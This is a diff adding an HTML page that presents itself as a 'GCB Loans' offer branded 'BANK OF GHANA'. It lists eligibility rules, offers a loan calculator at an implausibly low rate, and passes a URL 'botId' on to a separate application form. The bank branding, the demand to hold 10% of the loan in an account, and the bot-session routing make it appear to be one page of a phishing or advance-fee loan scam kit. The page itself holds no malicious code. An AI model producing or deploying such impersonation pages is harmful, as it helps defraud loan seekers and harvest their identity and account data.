@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GCB Loans</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial, sans-serif;
+background:#f5f5f5;
+}
+.header{
+width:100%;
+background:#ffffff;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+padding:20px 0 10px;
+border-bottom:1px solid #eee;
+}
+
+.header img{
+max-width:160px;
+height:auto;
+margin-bottom:8px;
+}
+
+.bank-text{
+font-size:14px;
+font-weight:bold;
+color:#000;
+letter-spacing:1px;
+}
+
+/* HEADER */
+.brand-bar{
+display:flex;
+height:70px;
+}
+
+.brand-bar img{
+height:100%;
+}
+
+.brand-text-wrap{
+flex:1;
+background:#e91e63;
+display:flex;
+align-items:center;
+justify-content:center;
+}
+
+.brand-text{
+color:#fff;
+font-size:22px;
+font-weight:bold;
+}
+
+/* CONTAINER */
+.container{
+max-width:420px;
+margin:auto;
+padding:20px;
+}
+
+/* STEP CONTROL */
+.step{
+display:none;
+}
+
+.step.active{
+display:block;
+}
+
+/* QUALIFICATION */
+.notice{
+background:#fff;
+padding:15px;
+border-left:4px solid #0a8f55;
+border-radius:10px;
+}
+
+.notice ul{
+padding-left:18px;
+}
+
+.notice li{
+margin-bottom:8px;
+font-size:14px;
+}
+
+.confirm{
+margin:20px 0;
+display:flex;
+gap:10px;
+}
+
+button{
+width:100%;
+padding:15px;
+border:none;
+border-radius:10px;
+font-size:16px;
+cursor:pointer;
+}
+
+.primary{
+background:#0a8f55;
+color:white;
+opacity:0.5;
+}
+
+.primary.enabled{
+opacity:1;
+}
+
+/* CALCULATOR */
+.card{
+background:#fff;
+padding:20px;
+border-radius:20px;
+box-shadow:0 10px 20px rgba(0,0,0,0.1);
+}
+
+.amount{
+font-size:26px;
+margin:10px 0;
+}
+
+.slider{
+width:100%;
+}
+
+.labels{
+display:flex;
+justify-content:space-between;
+font-size:12px;
+color:#777;
+}
+
+.term-buttons{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:10px;
+margin-top:15px;
+}
+
+.term{
+padding:10px;
+border:none;
+border-radius:10px;
+background:#eee;
+cursor:pointer;
+}
+
+.term.active{
+background:#ff7043;
+color:white;
+}
+
+.result{
+background:#f1f1f1;
+padding:15px;
+border-radius:15px;
+margin-top:15px;
+text-align:center;
+}
+
+.payment{
+font-size:24px;
+margin-top:5px;
+}
+
+.apply{
+background:#ff7043;
+color:white;
+margin-top:15px;
+}
+
+</style>
+</head>
+
+<body>
+    <!-- use this image -->
+     <!-- <img src="GCB-logo"> -->
+
+<div class="header">
+  <img src="GCB-logo.png" alt="GCB Logo">
+  <div class="bank-text">BANK OF GHANA</div>
+</div>
+
+<div class="container">
+
+<!-- STEP 1 -->
+<div class="step active" id="step1">
+
+<h2>Loan Qualifications</h2>
+<p>Please review before applying</p>
+
+<div class="notice">
+<ul>
+<li>Valid Telecel number</li>
+<li>18 years or older</li>
+<li>Ghanaian resident</li>
+<li>Valid Ghana Card</li>
+<li>Maintain 10% of loan amount in account</li>
+</ul>
+</div>
+
+<div class="confirm">
+<input type="checkbox" id="agree">
+<label>I confirm I meet the requirements</label>
+</div>
+
+<button id="continueBtn" class="primary" disabled>Continue</button>
+
+</div>
+
+<!-- STEP 2 -->
+<div class="step" id="step2">
+
+<div class="card">
+
+<h3>Loan Calculator</h3>
+
+<p>Loan Amount</p>
+<div class="amount" id="loanAmount">GHS 100</div>
+
+<input type="range" min="100" max="100000" value="100" step="100" class="slider" id="loanSlider">
+
+<div class="labels">
+<span>GHS 100</span>
+<span>GHS 100,000</span>
+</div>
+
+<h4>Loan Term</h4>
+
+<div id="months">12 months</div>
+
+<div class="term-buttons">
+<button class="term" data-month="6">6m</button>
+<button class="term active" data-month="12">12m</button>
+<button class="term" data-month="24">24m</button>
+<button class="term" data-month="36">36m</button>
+<button class="term" data-month="48">48m</button>
+<button class="term" data-month="60">60m</button>
+</div>
+
+<div class="result">
+<div>Monthly Payment</div>
+<div class="payment" id="payment">GHS 0</div>
+</div>
+
+<button class="apply" onclick="applyLoan()">APPLY NOW</button>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+/* BOT ID */
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+
+if (botId) localStorage.setItem('botId', botId);
+
+if (!localStorage.getItem('botId')){
+alert("Invalid session");
+window.location.href = "/bot/bot1";
+}
+
+/* STEP SWITCH */
+const checkbox = document.getElementById('agree');
+const btn = document.getElementById('continueBtn');
+
+checkbox.onchange = () => {
+btn.disabled = !checkbox.checked;
+btn.classList.toggle("enabled", checkbox.checked);
+};
+
+btn.onclick = () => {
+document.getElementById('step1').classList.remove('active');
+document.getElementById('step2').classList.add('active');
+};
+
+/* CALCULATOR */
+let slider = document.getElementById("loanSlider");
+let loanAmount = document.getElementById("loanAmount");
+let payment = document.getElementById("payment");
+let monthsDisplay = document.getElementById("months");
+
+let months = 12;
+const rate = 0.045/12;
+
+function calculate(){
+let P = slider.value;
+let n = months;
+let r = rate;
+
+let M = (P*r)/(1-Math.pow((1+r),-n));
+
+loanAmount.innerText = "GHS " + Number(P).toLocaleString();
+payment.innerText = "GHS " + M.toFixed(2);
+}
+
+slider.oninput = calculate;
+
+document.querySelectorAll(".term").forEach(btn=>{
+btn.onclick = function(){
+document.querySelectorAll(".term").forEach(b=>b.classList.remove("active"));
+this.classList.add("active");
+
+months = this.dataset.month;
+monthsDisplay.innerText = months + " months";
+
+calculate();
+}
+});
+
+/* APPLY */
+function applyLoan(){
+localStorage.setItem("loanAmount", slider.value);
+const botId = localStorage.getItem("botId");
+window.location.href = `form.html?botId=${botId}`;
+}
+
+calculate();
+
+</script>
+
+</body>
+</html>
